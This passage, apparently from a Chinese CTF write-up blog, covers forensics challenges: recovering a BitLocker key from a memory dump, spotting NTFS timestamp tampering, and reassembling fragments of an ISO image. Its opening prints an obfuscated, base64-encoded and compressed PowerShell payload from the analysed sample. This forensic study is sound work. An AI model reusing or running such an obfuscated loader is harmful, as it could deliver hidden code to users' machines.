sySTEm.iO.sTreaMReAdER( ( <span class="built_in">nEW-ObjEcT</span>  SystEm.iO.CompreSsiOn.DEfLATEstREam([<span class="type">IO.meMoryStream</span>] [<span class="type">CoNVeRT</span>]::fROMbASe64StRinG(<span class="string">&#x27;NVJdb5tAEHyv1P9wQpYAuZDaTpvEVqRi+5Sgmo/Axa0VRdoLXBMUmyMGu7Es//fuQvoAN7e7Nzua3RqUcJbgQVLIJ1hzNi/eGLMYe2gOFX+0zHpl9s0Uv4YHbnu8CzwI8nIW5UX4bNqM2RPGUtU4sPQSH+mmsFbIY87kFit3A6ohVnGIFbLOdLlXCdFhAlOT3rGAEJYQvfIsgmAjw/mJXTPLssxsg3U59VTvyrT7JjvDS8bwN8NvbPYt81amMeItpi1TI3omaErK0fO5bNr7LQVkWjYkqlZtkVtRUK8xxAQxxqylGVwM3dFX6jtw6TgbnrPRCMFlm75i3xAPhq2aqUnNKFyWqhNiu0bC4wV6kXHDsh6yF5k8Xgz7Hbi6+ACXI/vLQyoSv7x5/EgNbXvy+VPvOAtyvWuggvuGvOhZaNFS/wTlqN9xwqGuwQddst7Rh3AfvQKHLAoCsq4jmMJBgKrpMbm/By8pcDQLzlju3zFn6S12zB6PjXsIfcj0XBmu8Qyqma4ETw2rd8w2MI92IGKU0HGqEGYacp7/Z2U+CB7gqJdy67c2dHYsOA0H598N33b3cr3j2EzoKXgpiv1+XjfbIryhRk+wakhq16TSqYhpKcHbpNTox9GYgyekcY0KcFGyKFf56YTF7drg1ji/+BMk/G7H04Y599sCFW3+NG71l0aXZRntjFu94FGhHidQzYvOsSiOaLsFxaY6P6CbFWioRSUTGdSnyT8=&#x27;</span> ) , [<span class="type">IO.coMPressION.cOMPresSiOnmOde</span>]::dEcOMPresS)), [<span class="type">TexT.ENcODInG</span>]::AsCIi)).ReaDToeNd()</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623517143196/da7ea97787528ea9c0e3fc7dfa48fae14d936f8b.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication</span><br></pre></td></tr></table></figure><h3 id="CipherMan"><a href="#CipherMan" class="headerlink" title="CipherMan"></a>CipherMan</h3><blockquote><p>The attacker maliciously accessed the user’s PC and encrypted specific volumes. How to decrypt the volume?</p></blockquote><p>经过两次解压后可得 Secret 和 memory，file 一下可知 Secret 是磁盘文件。使用如下指令抓取 Secret 的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lemonprefect@LAPTOP-3E49IU3M:/mnt/f/CTFs/2021/qwb/CipherMan2$ mmls Secret </span><br><span class="line">DOS Partition Table</span><br><span class="line">Offset Sector: 0</span><br><span class="line">Units are <span class="keyword">in</span> 512-byte sectors</span><br><span class="line"></span><br><span class="line">      Slot      Start        End          Length       Description</span><br><span class="line">000:  Meta      0000000000   0000000000   0000000001   Primary Table (<span class="comment">#0)</span></span><br><span class="line">001:  -------   0000000000   0000000127   0000000128   Unallocated</span><br><span class="line">002:  000:000   0000000128   0001042559   0001042432   NTFS / exFAT (0x07)</span><br><span class="line">003:  -------   0001042560   0001048575   0000006016   Unallocated</span><br></pre></td></tr></table></figure><p>此时尝试挂载 Secret，可以得到其是 BitLocker 保护的磁盘的提示。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@LAPTOP-3E49IU3M:/mnt/f/CTFs/2021/qwb/CipherMan2<span class="comment"># mount Secret /mnt/ctf -o offset=$((128*512)) </span></span><br><span class="line">mount: /mnt/ctf: unknown filesystem <span class="built_in">type</span> <span class="string">&#x27;BitLocker&#x27;</span>.</span><br></pre></td></tr></table></figure><p>使用 volatility2 探测 memory 的 profile。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lemonprefect@LAPTOP-3E49IU3M:/mnt/f/ghrepos/volatility2$ python2 vol.py -f memory2 imageinfo</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86</span><br><span class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/mnt/f/ghrepos/volatility2/memory2)</span><br><span class="line">                      PAE <span class="built_in">type</span> : PAE</span><br><span class="line">                           DTB : 0x185000L</span><br><span class="line">                          KDBG : 0x82d72c28L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 1</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 0 : 0x82d73c00L</span><br><span class="line">             KUSER_SHARED_DATA : 0xffdf0000L</span><br><span class="line">           Image date and time : 2018-08-06 08:41:18 UTC+0000</span><br><span class="line">     Image <span class="built_in">local</span> date and time : 2018-08-06 17:41:18 +0900</span><br></pre></td></tr></table></figure><p>取其 profile 为 <code>Win7SP1x86_23418</code>，使用 filescan 筛选桌面文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lemonprefect@LAPTOP-3E49IU3M:/mnt/f/ghrepos/volatility2$ python2 vol.py -f memory2 --profile=Win7SP1x86_23418 filescan | grep <span class="string">&quot;Desktop&quot;</span></span><br><span class="line">...</span><br><span class="line">0x000000007e02af80      8      0 -W---- \Device\HarddiskVolume2\Users\RockAndRoll\Desktop\BitLocker 복구 키 168F1291-82C1-4BF2-B634-9CCCEC63E9ED.txt</span><br></pre></td></tr></table></figure><p>将上述文件使用 dumpfiles 恢复，得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">BitLocker 드라이브 암호화 복구 키 </span><br><span class="line"></span><br><span class="line"> 복구 키는 BitLocker로 보호되는 드라이브에서 데이터를 검색하기 위해 사용됩니다.</span><br><span class="line"></span><br><span class="line">이 키가 올바른 복구 키인지 확인하려면 복구 화면에 표시된 것과 ID를 비교하십시오.</span><br><span class="line"></span><br><span class="line">복구 키 ID: 168F1291-82C1-4B</span><br><span class="line">전체 복구 키 ID: 168F1291-82C1-4BF2-B634-9CCCEC63E9ED</span><br><span class="line"></span><br><span class="line">BitLocker 복구 키:</span><br><span class="line">221628-533357-667392-449185-516428-718443-190674-375100</span><br></pre></td></tr></table></figure><p>使用如下指令配合恢复密钥将磁盘挂载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bdemount -o $((<span class="number">128</span>*<span class="number">512</span>)) -r 221628-533357-667392-449185-516428-718443-190674-375100 Secret /mnt/ctf</span><br></pre></td></tr></table></figure><p>将挂载所得磁盘中的文件 bde1 再次使用如下指令挂载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o ro bde1 /mnt/ctf2</span><br></pre></td></tr></table></figure><p>即可在挂载处找到 README.txt，其中包含的字符串即为 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wow, you have a great ability. How did you solve this? Are you a hacker? Please give me a lesson later.</span><br></pre></td></tr></table></figure><h3 id="EzTime"><a href="#EzTime" class="headerlink" title="EzTime"></a>EzTime</h3><blockquote><p>Forensic.Find a file that a time attribute has been modified by a program.</p></blockquote><p>解压两次得到附件 $MFT 和 ​$LogFile，使用 NTFS Log Tracker 分析文件导出 csv。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623552765505/57240b89d028fb27c1709e7879f6df2104a327c8.png" alt="image-20210613105244681"></p><p>筛选出修改时间大于访问时间的条目，可得 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">File&#x2F;Directory NameFull PathCreate TimeModified TimeMFT_Modified TimeAccess Time</span><br><span class="line">$Quota\$Extend\$Quota2021&#x2F;5&#x2F;23 0:252021&#x2F;5&#x2F;23 0:252021&#x2F;5&#x2F;23 0:252021&#x2F;5&#x2F;23 0:25</span><br><span class="line">daniel-olah-HNkgPFBShSw-unsplash.jpg\daniel-olah-HNkgPFBShSw-unsplash.jpg2021&#x2F;5&#x2F;23 0:252021&#x2F;5&#x2F;23 0:252021&#x2F;5&#x2F;23 0:272021&#x2F;5&#x2F;23 0:25</span><br><span class="line">louis-reed-hzp_aT02R48-unsplash.jpg\louis-reed-hzp_aT02R48-unsplash.jpg2021&#x2F;5&#x2F;23 0:262021&#x2F;5&#x2F;23 0:262021&#x2F;5&#x2F;23 0:272021&#x2F;5&#x2F;23 0:26</span><br><span class="line">&#123;45EF6FFC-F0B6-4000-A7C0-8D1549355A8C&#125;.png\&#123;45EF6FFC-F0B6-4000-A7C0-8D1549355A8C&#125;.png2021&#x2F;5&#x2F;23 0:282021&#x2F;5&#x2F;19 23:592021&#x2F;5&#x2F;23 0:322021&#x2F;5&#x2F;23 0:28</span><br><span class="line">BlackboardFieldPillBackground.png\fr_MA\BlackboardFieldPillBackground.png2021&#x2F;5&#x2F;23 0:282018&#x2F;2&#x2F;20 17:242021&#x2F;5&#x2F;23 0:332021&#x2F;5&#x2F;23 0:28</span><br><span class="line">editmode-run-test.png\fr_MA\editmode-run-test.png2021&#x2F;5&#x2F;23 0:282020&#x2F;8&#x2F;5 13:382021&#x2F;5&#x2F;23 0:332021&#x2F;5&#x2F;23 0:28</span><br><span class="line">IMG_2279.JPG\fr_MA\IMG_2279.JPG2021&#x2F;5&#x2F;23 0:292020&#x2F;10&#x2F;19 23:512021&#x2F;5&#x2F;23 0:332021&#x2F;5&#x2F;23 0:29</span><br><span class="line">IMG_2281.JPG\fr_MA\IMG_2281.JPG2021&#x2F;5&#x2F;23 0:292020&#x2F;10&#x2F;19 23:502021&#x2F;5&#x2F;23 0:332021&#x2F;5&#x2F;23 0:29</span><br><span class="line">&#123;0A2792E2-9495-4DF8-93F5-581086B905B6&#125;.png\en_US\&#123;0A2792E2-9495-4DF8-93F5-581086B905B6&#125;.png2021&#x2F;5&#x2F;23 0:282021&#x2F;5&#x2F;19 20:542021&#x2F;5&#x2F;23 0:332021&#x2F;5&#x2F;23 0:28</span><br><span class="line">&#123;0AC4E564-51D1-41CF-BA81-DA2629CBB93B&#125;.png\en_GB\&#123;0AC4E564-51D1-41CF-BA81-DA2629CBB93B&#125;.png2021&#x2F;5&#x2F;23 0:282021&#x2F;5&#x2F;22 21:382021&#x2F;5&#x2F;23 0:332021&#x2F;5&#x2F;23 0:28</span><br><span class="line">&#123;0A8E35BF-7598-4676-9882-D7E157D5034C&#125;.png\es_NA\&#123;0A8E35BF-7598-4676-9882-D7E157D5034C&#125;.png2021&#x2F;5&#x2F;23 0:282021&#x2F;5&#x2F;19 20:542021&#x2F;5&#x2F;23 0:332021&#x2F;5&#x2F;23 0:28</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;45EF6FFC-F0B6-4000-A7C0-8D1549355A8C&#125;.png</span><br></pre></td></tr></table></figure><h3 id="ISO1995"><a href="#ISO1995" class="headerlink" title="ISO1995"></a>ISO1995</h3><blockquote><p>We follow ISO1995. ISO1995 has many problems though. One known problem is a time.</p></blockquote><p>将附件提取出来， file 一次可以得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iso1995: ISO 9660 CD-ROM filesystem data &#39;Debian 10.6.0 AMD64 Network&#39;</span><br></pre></td></tr></table></figure><p>使用 UltraISO 加载磁盘，将其中的文件提取出来。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623555716068/3f048fcd5acf1da7e59bc548f9db86bcb1080e9f.png"></p><p>使用 010 Editor 打开文件可以发现明显顺序，将 <code>FF FF FF FF</code> 后面的两字节提取出来拼接成一个十六进制数字。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623563522098/55f594d43ad02f6a55a4551bf4718b0be3185cf8.png"></p><p>写一个脚本按照顺序去访问并拼接文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">indexes = [<span class="number">0x000</span>,<span class="number">0x00AA</span>,<span class="number">0x0357</span>,<span class="number">0x02C5</span>,<span class="number">0x0023</span>,<span class="number">0x0268</span>,<span class="number">0x02F2</span>,<span class="number">0x02DB</span>,<span class="number">0x03E5</span>,<span class="number">0x01E5</span>,<span class="number">0x0101</span>,<span class="number">0x02A8</span>,<span class="number">0x0236</span>,<span class="number">0x0267</span>,<span class="number">0x03F2</span>,<span class="number">0x009E</span>,<span class="number">0x002A</span>,<span class="number">0x00E0</span>,<span class="number">0x0398</span>,<span class="number">0x01B0</span>,<span class="number">0x028A</span>,<span class="number">0x006D</span>,<span class="number">0x03D1</span>,<span class="number">0x019D</span>,<span class="number">0x01CB</span>,<span class="number">0x031B</span>,<span class="number">0x0319</span>,<span class="number">0x02A0</span>,<span class="number">0x0259</span>,<span class="number">0x00A1</span>,<span class="number">0x022D</span>,<span class="number">0x0305</span>,<span class="number">0x0051</span>,<span class="number">0x0231</span>,<span class="number">0x003C</span>,<span class="number">0x02C7</span>,<span class="number">0x02E3</span>,<span class="number">0x0199</span>,<span class="number">0x0235</span>,<span class="number">0x037E</span>,<span class="number">0x0185</span>,<span class="number">0x012E</span>,<span class="number">0x0074</span>,<span class="number">0x00A2</span>,<span class="number">0x006C</span>,<span class="number">0x0216</span>,<span class="number">0x02FC</span>,<span class="number">0x01B4</span>,<span class="number">0x01AA</span>,<span class="number">0x0269</span>,<span class="number">0x02CE</span>,<span class="number">0x00FD</span>,<span class="number">0x00B6</span>,<span class="number">0x01D3</span>,<span class="number">0x0049</span>,<span class="number">0x03BC</span>,<span class="number">0x02F0</span>,<span class="number">0x00F2</span>,<span class="number">0x0165</span>,<span class="number">0x03A4</span>,<span class="number">0x0325</span>,<span class="number">0x01EE</span>,<span class="number">0x03B4</span>,<span class="number">0x03DE</span>,<span class="number">0x02DE</span>,<span class="number">0x03F8</span>,<span class="number">0x0147</span>,<span class="number">0x024F</span>,<span class="number">0x033C</span>,<span class="number">0x0263</span>,<span class="number">0x001C</span>,<span class="number">0x03F4</span>,<span class="number">0x0097</span>,<span class="number">0x02EC</span>,<span class="number">0x0091</span>,<span class="number">0x000C</span>,<span class="number">0x00BF</span>,<span class="number">0x0168</span>,<span class="number">0x0233</span>,<span class="number">0x01A4</span>,<span class="number">0x038C</span>,<span class="number">0x024E</span>,<span class="number">0x024D</span>,<span class="number">0x03C5</span>,<span class="number">0x0086</span>,<span class="number">0x037C</span>,<span class="number">0x0012</span>,<span class="number">0x02C1</span>,<span class="number">0x0111</span>,<span class="number">0x0126</span>,<span class="number">0x0368</span>,<span class="number">0x01C7</span>,<span class="number">0x0007</span>,<span class="number">0x02F3</span>,<span class="number">0x0070</span>,<span class="number">0x00BB</span>,<span class="number">0x0304</span>,<span class="number">0x036B</span>,<span class="number">0x02D3</span>,<span class="number">0x0041</span>,<span class="number">0x03AF</span>,<span class="number">0x0130</span>,<span class="number">0x017C</span>,<span class="number">0x0034</span>,<span class="number">0x0397</span>,<span class="number">0x0061</span>,<span class="number">0x0081</span>,<span class="number">0x02A3</span>,<span class="number">0x01A8</span>,<span class="number">0x0092</span>,<span class="number">0x012A</span>,<span class="number">0x002C</span>,<span class="number">0x0135</span>,<span class="number">0x0323</span>,<span class="number">0x028E</span>,<span class="number">0x00F9</span>,<span class="number">0x02D7</span>,<span class="number">0x0109</span>,<span class="number">0x01A7</span>,<span class="number">0x02F8</span>,<span class="number">0x0327</span>,<span class="number">0x01EF</span>,<span class="number">0x000F</span>,<span class="number">0x03C8</span>,<span class="number">0x020E</span>,<span class="number">0x014A</span>,<span class="number">0x0260</span>,<span class="number">0x0344</span>,<span class="number">0x0343</span>,<span class="number">0x00C4</span>,<span class="number">0x022C</span>,<span class="number">0x0099</span>,<span class="number">0x026D</span>,<span class="number">0x008A</span>,<span class="number">0x0301</span>,<span class="number">0x03F1</span>,<span class="number">0x0273</span>,<span class="number">0x031F</span>,<span class="number">0x009D</span>,<span class="number">0x00F5</span>,<span class="number">0x01FA</span>,<span class="number">0x010D</span>,<span class="number">0x037A</span>,<span class="number">0x0361</span>,<span class="number">0x01E1</span>,<span class="number">0x0307</span>,<span class="number">0x0215</span>,<span class="number">0x02E2</span>,<span class="number">0x01B7</span>,<span class="number">0x0225</span>,<span class="number">0x0310</span>,<span class="number">0x0035</span>,<span class="number">0x0243</span>,<span class="number">0x0286</span>,<span class="number">0x02D8</span>,<span class="number">0x0108</span>,<span class="number">0x03EF</span>,<span class="number">0x01F5</span>,<span class="number">0x030A</span>,<span class="number">0x0339</span>,<span class="number">0x0170</span>,<span class="number">0x0107</span>,<span class="number">0x0177</span>,<span class="number">0x0100</span>,<span class="number">0x005C</span>,<span class="number">0x021C</span>,<span class="number">0x0169</span>,<span class="number">0x0063</span>,<span class="number">0x0102</span>,<span class="number">0x03E1</span>,<span class="number">0x039C</span>,<span class="number">0x00DA</span>,<span class="number">0x037D</span>,<span class="number">0x01BC</span>,<span class="number">0x0140</span>,<span class="number">0x02A5</span>,<span class="number">0x0349</span>,<span class="number">0x00D8</span>,<span class="number">0x033A</span>,<span class="number">0x00C1</span>,<span class="number">0x0044</span>,<span class="number">0x03CF</span>,<span class="number">0x0291</span>,<span class="number">0x01FF</span>,<span class="number">0x03D8</span>,<span class="number">0x0239</span>,<span class="number">0x0338</span>,<span class="number">0x030B</span>,<span class="number">0x0106</span>,<span class="number">0x02B3</span>,<span class="number">0x03FB</span>,<span class="number">0x03F0</span>,<span class="number">0x0077</span>,<span class="number">0x01CD</span>,<span class="number">0x0256</span>,<span class="number">0x00EC</span>,<span class="number">0x004C</span>,<span class="number">0x03EB</span>,<span class="number">0x0001</span>,<span class="number">0x0162</span>,<span class="number">0x0266</span>,<span class="number">0x035B</span>,<span class="number">0x0298</span>,<span class="number">0x000A</span>,<span class="number">0x02CC</span>,<span class="number">0x0248</span>,<span class="number">0x0115</span>,<span class="number">0x00A8</span>,<span class="number">0x034D</span>,<span class="number">0x0254</span>,<span class="number">0x01D7</span>,<span class="number">0x03E9</span>,<span class="number">0x035A</span>,<span class="number">0x0227</span>,<span class="number">0x0065</span>,<span class="number">0x016B</span>,<span class="number">0x03AC</span>,<span class="number">0x0383</span>,<span class="number">0x0039</span>,<span class="number">0x0195</span>,<span class="number">0x03EA</span>,<span class="number">0x030D</span>,<span class="number">0x03AE</span>,<span class="number">0x0282</span>,<span class="number">0x0078</span>,<span class="number">0x0015</span>,<span class="number">0x01B8</span>,<span class="number">0x011D</span>,<span class="number">0x0186</span>,<span class="number">0x00F6</span>,<span class="number">0x0018</span>,<span class="number">0x0148</span>,<span class="number">0x038E</span>,<span class="number">0x00F4</span>,<span class="number">0x0137</span>,<span class="number">0x01F0</span>,<span class="number">0x0122</span>,<span class="number">0x03CD</span>,<span class="number">0x011E</span>,<span class="number">0x0272</span>,<span class="number">0x01CE</span>,<span class="number">0x01F1</span>,<span class="number">0x03B8</span>,<span class="number">0x022B</span>,<span class="number">0x02AE</span>,<span class="number">0x00BE</span>,<span class="number">0x0385</span>,<span class="number">0x0133</span>,<span class="number">0x033E</span>,<span class="number">0x020C</span>,<span class="number">0x0210</span>,<span class="number">0x03A9</span>,<span class="number">0x01BD</span>,<span class="number">0x00ED</span>,<span class="number">0x0334</span>,<span class="number">0x0330</span>,<span class="number">0x0214</span>,<span class="number">0x008F</span>,<span class="number">0x014B</span>,<span class="number">0x00D7</span>,<span class="number">0x0004</span>,<span class="number">0x0265</span>,<span class="number">0x0143</span>,<span class="number">0x01A9</span>,<span class="number">0x0180</span>,<span class="number">0x0178</span>,<span class="number">0x034C</span>,<span class="number">0x0062</span>,<span class="number">0x0302</span>,<span class="number">0x01BE</span>,<span class="number">0x02F5</span>,<span class="number">0x0366</span>,<span class="number">0x00AD</span>,<span class="number">0x02AD</span>,<span class="number">0x0164</span>,<span class="number">0x0333</span>,<span class="number">0x0142</span>,<span class="number">0x036E</span>,<span class="number">0x03E0</span>,<span class="number">0x0345</span>,<span class="number">0x018A</span>,<span class="number">0x00E3</span>,<span class="number">0x00A3</span>,<span class="number">0x00FB</span>,<span class="number">0x028F</span>,<span class="number">0x03BF</span>,<span class="number">0x022F</span>,<span class="number">0x02DC</span>,<span class="number">0x039E</span>,<span class="number">0x03D9</span>,<span class="number">0x0314</span>,<span class="number">0x0068</span>,<span class="number">0x03B6</span>,<span class="number">0x00A6</span>,<span class="number">0x02D2</span>,<span class="number">0x0222</span>,<span class="number">0x0103</span>,<span class="number">0x004D</span>,<span class="number">0x03F9</span>,<span class="number">0x008B</span>,<span class="number">0x01F6</span>,<span class="number">0x018E</span>,<span class="number">0x03E3</span>,<span class="number">0x0300</span>,<span class="number">0x00C0</span>,<span class="number">0x02AA</span>,<span class="number">0x01A1</span>,<span class="number">0x0139</span>,<span class="number">0x019F</span>,<span class="number">0x0360</span>,<span class="number">0x025B</span>,<span class="number">0x01BA</span>,<span class="number">0x0276</span>,<span class="number">0x00F0</span>,<span class="number">0x038D</span>,<span class="number">0x001F</span>,<span class="number">0x0006</span>,<span class="number">0x028C</span>,<span class="number">0x0132</span>,<span class="number">0x03D6</span>,<span class="number">0x020B</span>,<span class="number">0x0198</span>,<span class="number">0x0188</span>,<span class="number">0x02A1</span>,<span class="number">0x0238</span>,<span class="number">0x01E6</span>,<span class="number">0x007C</span>,<span class="number">0x035D</span>,<span class="number">0x0064</span>,<span class="number">0x009F</span>,<span class="number">0x024A</span>,<span class="number">0x00D0</span>,<span class="number">0x01BB</span>,<span class="number">0x005E</span>,<span class="number">0x02BD</span>,<span class="number">0x019A</span>,<span class="number">0x0193</span>,<span class="number">0x00F8</span>,<span class="number">0x03A3</span>,<span class="number">0x0362</span>,<span class="number">0x019E</span>,<span class="number">0x00D4</span>,<span class="number">0x026E</span>,<span class="number">0x03EE</span>,<span class="number">0x0352</span>,<span class="number">0x015F</span>,<span class="number">0x0232</span>,<span class="number">0x01FB</span>,<span class="number">0x03C0</span>,<span class="number">0x02BA</span>,<span class="number">0x03BE</span>,<span class="number">0x02EB</span>,<span class="number">0x01C1</span>,<span class="number">0x0390</span>,<span class="number">0x0129</span>,<span class="number">0x0399</span>,<span class="number">0x00CC</span>,<span class="number">0x02AC</span>,<span class="number">0x02BB</span>,<span class="number">0x02A9</span>,<span class="number">0x0038</span>,<span class="number">0x00E4</span>,<span class="number">0x00E1</span>,<span class="number">0x009C</span>,<span class="number">0x020A</span>,<span class="number">0x0320</span>,<span class="number">0x0396</span>,<span class="number">0x0207</span>,<span class="number">0x01F9</span>,<span class="number">0x0192</span>,<span class="number">0x034E</span>,<span class="number">0x02B5</span>,<span class="number">0x01F8</span>,<span class="number">0x0328</span>,<span class="number">0x03CB</span>,<span class="number">0x0242</span>,<span class="number">0x00B7</span>,<span class="number">0x0381</span>,<span class="number">0x00B8</span>,<span class="number">0x03E7</span>,<span class="number">0x012F</span>,<span class="number">0x019C</span>,<span class="number">0x031C</span>,<span class="number">0x03F5</span>,<span class="number">0x0230</span>,<span class="number">0x023C</span>,<span class="number">0x0113</span>,<span class="number">0x006F</span>,<span class="number">0x00AE</span>,<span class="number">0x01DE</span>,<span class="number">0x0071</span>,<span class="number">0x0296</span>,<span class="number">0x01F7</span>,<span class="number">0x02A2</span>,<span class="number">0x004A</span>,<span class="number">0x0128</span>,<span class="number">0x0110</span>,<span class="number">0x005F</span>,<span class="number">0x0247</span>,<span class="number">0x01C4</span>,<span class="number">0x034B</span>,<span class="number">0x03E6</span>,<span class="number">0x03ED</span>,<span class="number">0x0318</span>,<span class="number">0x008C</span>,<span class="number">0x015A</span>,<span class="number">0x03BA</span>,<span class="number">0x03F6</span>,<span class="number">0x00AB</span>,<span class="number">0x0079</span>,<span class="number">0x0281</span>,<span class="number">0x00AF</span>,<span class="number">0x00EA</span>,<span class="number">0x01A2</span>,<span class="number">0x0127</span>,<span class="number">0x011C</span>,<span class="number">0x0056</span>,<span class="number">0x018F</span>,<span class="number">0x02BF</span>,<span class="number">0x0002</span>,<span class="number">0x0183</span>,<span class="number">0x03A1</span>,<span class="number">0x00CF</span>,<span class="number">0x013D</span>,<span class="number">0x029A</span>,<span class="number">0x031E</span>,<span class="number">0x0271</span>,<span class="number">0x0138</span>,<span class="number">0x0219</span>,<span class="number">0x0364</span>,<span class="number">0x0261</span>,<span class="number">0x0076</span>,<span class="number">0x01AB</span>,<span class="number">0x03E8</span>,<span class="number">0x00A5</span>,<span class="number">0x01EB</span>,<span class="number">0x03DD</span>,<span class="number">0x01A3</span>,<span class="number">0x0060</span>,<span class="number">0x0096</span>,<span class="number">0x017B</span>,<span class="number">0x007E</span>,<span class="number">0x01B3</span>,<span class="number">0x0354</span>,<span class="number">0x03E2</span>,<span class="number">0x012B</span>,<span class="number">0x0171</span>,<span class="number">0x03FC</span>,<span class="number">0x0009</span>,<span class="number">0x01C9</span>,<span class="number">0x01FC</span>,<span class="number">0x021E</span>,<span class="number">0x00B9</span>,<span class="number">0x032E</span>,<span class="number">0x02E4</span>,<span class="number">0x026C</span>,<span class="number">0x0085</span>,<span class="number">0x02D9</span>,<span class="number">0x02DF</span>,<span class="number">0x027A</span>,<span class="number">0x01AC</span>,<span class="number">0x03CE</span>,<span class="number">0x00E2</span>,<span class="number">0x0067</span>,<span class="number">0x0365</span>,<span class="number">0x0384</span>,<span class="number">0x01DC</span>,<span class="number">0x01F4</span>,<span class="number">0x0212</span>,<span class="number">0x0120</span>,<span class="number">0x00CD</span>,<span class="number">0x0221</span>,<span class="number">0x021B</span>,<span class="number">0x01DA</span>,<span class="number">0x0209</span>,<span class="number">0x013E</span>,<span class="number">0x031D</span>,<span class="number">0x005B</span>,<span class="number">0x0378</span>,<span class="number">0x016C</span>,<span class="number">0x0073</span>,<span class="number">0x00CA</span>,<span class="number">0x0255</span>,<span class="number">0x008D</span>,<span class="number">0x00C2</span>,<span class="number">0x0082</span>,<span class="number">0x009A</span>,<span class="number">0x0224</span>,<span class="number">0x001B</span>,<span class="number">0x0013</span>,<span class="number">0x0375</span>,<span class="number">0x0347</span>,<span class="number">0x0278</span>,<span class="number">0x01D6</span>,<span class="number">0x03D0</span>,<span class="number">0x00EF</span>,<span class="number">0x0371</span>,<span class="number">0x03EC</span>,<span class="number">0x002F</span>,<span class="number">0x03A0</span>,<span class="number">0x02B1</span>,<span class="number">0x03FA</span>,<span class="number">0x0025</span>,<span class="number">0x01D8</span>,<span class="number">0x004F</span>,<span class="number">0x01B1</span>,<span class="number">0x02C3</span>,<span class="number">0x029F</span>,<span class="number">0x0309</span>,<span class="number">0x02A4</span>,<span class="number">0x028B</span>,<span class="number">0x0093</span>,<span class="number">0x02BC</span>,<span class="number">0x00D5</span>,<span class="number">0x0288</span>,<span class="number">0x01B6</span>,<span class="number">0x00FF</span>,<span class="number">0x0114</span>,<span class="number">0x03F3</span>,<span class="number">0x030E</span>,<span class="number">0x021F</span>,<span class="number">0x0021</span>,<span class="number">0x00D6</span>,<span class="number">0x018D</span>,<span class="number">0x036F</span>,<span class="number">0x0321</span>,<span class="number">0x0353</span>,<span class="number">0x0029</span>,<span class="number">0x015B</span>,<span class="number">0x0346</span>,<span class="number">0x03D7</span>,<span class="number">0x034F</span>,<span class="number">0x0043</span>,<span class="number">0x0173</span>,<span class="number">0x03DB</span>,<span class="number">0x0160</span>,<span class="number">0x0292</span>,<span class="number">0x0392</span>,<span class="number">0x0337</span>,<span class="number">0x0030</span>,<span class="number">0x017F</span>,<span class="number">0x02F7</span>,<span class="number">0x0124</span>,<span class="number">0x003E</span>,<span class="number">0x02F6</span>,<span class="number">0x01AF</span>,<span 